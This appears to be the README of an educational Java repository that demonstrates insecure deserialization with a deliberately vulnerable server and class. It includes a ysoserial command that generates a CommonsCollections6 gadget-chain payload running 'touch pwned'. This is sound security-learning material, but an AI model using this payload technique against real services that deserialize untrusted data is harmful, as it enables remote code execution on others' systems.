# OffenciveJava

A Java project focused on understanding serialization, deserialization, and the security implications of deserializing untrusted data.

## Overview

This project demonstrates how Java object deserialization works and highlights common security risks associated with vulnerable deserialization mechanisms.

The repository includes:

- Object serialization examples
- Object deserialization examples
- A simple server implementation
- Experiments involving gadget chains from Apache Commons Collections
- Educational demonstrations of insecure deserialization

## Technologies

- Java 8
- Apache Commons Collections 3.2.1
- Java Serialization API
- Socket Programming

## Requirements

- Java 8 (required for compatibility with ysoserial)
- Apache Commons Collections 3.2.1
- ysoserial

## Project Structure

```text
.
├── resources
│   └── commons-collections-3.2.1.jar
├── serverRelated
│   ├── client.java
│   └── server.java
├── serialRelated
│   ├── serialisation.java
│   └── deserialisation.java
└── target
    └── classes
        ├── Personnes.java
        ├── Vulnerability.java
        └── TestSerialisations.java
```

## Compilation

Move to the Java source directory and compile the project using Java 8:

```bash
[java8path]/javac -cp ../resources/commons-collections-3.2.1.jar:. \
serverRelated/server.java \
serialRelated/serialisation.java \
serialRelated/deserialisation.java \
serverRelated/client.java \
target/classes/Vulnerability.java \
target/classes/TestSerialisations.java
```

## Running

Launch the application using:

```bash
[java8path]/java -cp ../resources/commons-collections-3.2.1.jar:. \
serverRelated/server \
serialRelated/serialisation \
serialRelated/deserialisation
```

## Client

Connect client to the server:

```bash
[java8path]/java -cp ../resources/commons-collections-3.2.1.jar:. serverRelated/client 
```

## Vulnerability

Launch vulnerability class:

```bash
[java8path]/java -cp ../resources/commons-collections-3.2.1.jar:. target/classes/TestSerialisations payload.ser
```

## Payload Generation

Generate a serialized payload using ysoserial:

```bash
[java8path]/java -jar ysoserial-all.jar CommonsCollections6 "touch pwned" > payload.ser
```

## TestSerialisation

Launch the TestSerialisation:

```bash
[java8path]/java -cp ../resources/commons-collections-3.2.1.jar:. target/classes/TestSerialisations

```

The generated payload can then be used during deserialization experiments.

## Learning Objectives

This project was created to explore:

- Java object serialization
- Java object deserialization
- Remote communication using sockets
- Class loading mechanisms
- Gadget chains
- Apache Commons Collections internals
- Insecure deserialization vulnerabilities
- Defensive approaches to serialization security

## Disclaimer

This repository is intended exclusively for educational purposes, security research, and laboratory environments. All experiments should be conducted on systems you own or have explicit authorization to test.
